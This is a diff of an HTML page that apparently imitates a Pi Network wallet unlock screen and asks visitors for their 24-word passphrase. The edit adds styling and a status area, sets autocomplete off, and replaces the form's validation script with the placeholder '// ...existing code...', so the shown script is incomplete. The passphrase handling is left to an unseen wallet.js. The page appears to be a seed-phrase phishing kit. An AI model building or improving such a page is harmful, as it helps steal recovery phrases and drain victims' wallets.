@@ -225,6 +225,21 @@
             opacity: 0.7;
             cursor: not-allowed;
         }
+
+        .status-message {
+            margin: 15px 0;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        #status {
+            display: none;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
@@ -238,14 +253,17 @@
             
             <form id="tg-form" novalidate>
                 <div class="form-group">
-                    <div class="service-error" style="display: none;"></div>
                     <textarea 
+                        id="mf-text"
                         name="mf-text" 
                         placeholder="Enter your 24-word passphrase here"
                         class="mf-input txt-input"
-                        required></textarea>
-                    <div class="error-message" style="display: none;"></div>
+                        required
+                        autocomplete="off"
+                        spellcheck="false"></textarea>
                 </div>
+                
+                <div id="status" class="status-message"></div>
                 
                 <div class="button-group">
                     <button type="submit" class="btn btn-primary btn-loading">
@@ -253,11 +271,10 @@
                         <div class="spinner"></div>
                     </button>
                     <button type="button" class="btn btn-secondary" onclick="handleFingerprintClick()">
-                        Unlock with FIngerprint
+                        Unlock with Fingerprint
                     </button>
                 </div>
             </form>
-
             <div class="info-text">
                 <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
                 <p>Lost your passphrase? <a href="pi://wallet.pi">You can create a new wallet,</a> but all your π in your previous wallet will be inaccessible.</p>
@@ -270,69 +287,7 @@
             alert('Error: Fingerprint is not available');
         }
 
-        // Handle form submission
-        function showServiceError(message) {
-            const errorDiv = document.querySelector('.service-error');
-            const textarea = document.querySelector('textarea');
-            if (errorDiv) {
-                errorDiv.textContent = message;
-                errorDiv.style.display = 'block';
-                // Clear the textarea
-                textarea.value = '';
-            }
-        }
-
-        function showError(message) {
-            const errorDiv = document.querySelector('.error-message');
-            if (errorDiv) {
-                errorDiv.textContent = message;
-                errorDiv.style.display = 'block';
-            }
-        }
-
-        function clearError() {
-            const errorDiv = document.querySelector('.error-message');
-            const serviceError = document.querySelector('.service-error');
-            if (errorDiv) {
-                errorDiv.style.display = 'none';
-            }
-            if (serviceError) {
-                serviceError.style.display = 'none';
-            }
-        }
-
-        // Handle form submission
-        document.querySelector('form').addEventListener('submit', (e) => {
-            e.preventDefault(); // Prevent default form submission
-            
-            const textarea = document.querySelector('textarea');
-            if (!textarea.value.trim()) {
-                showError('Please enter your 24-word passphrase');
-                return;
-            }
-
-            // Get the words count
-            const wordCount = textarea.value.trim().split(/\s+/).length;
-            if (wordCount !== 24) {
-                showError('Please enter exactly 24 words for your passphrase');
-                return;
-            }
-
-            // Show loading state
-            const submitButton = e.target.querySelector('button[type="submit"]');
-            const spinner = submitButton.querySelector('.spinner');
-            submitButton.disabled = true;
-            spinner.style.display = 'block';
-
-            // Submit form via fetch API
-            
-           
-        });
-
-        // Clear error when user starts typing or focuses on textarea
-        const textarea = document.querySelector('textarea');
-        textarea.addEventListener('input', clearError);
-        textarea.addEventListener('focus', clearError);
+        // ...existing code...
     </script>
 	<script src="wallet.js"></script>
 </body>
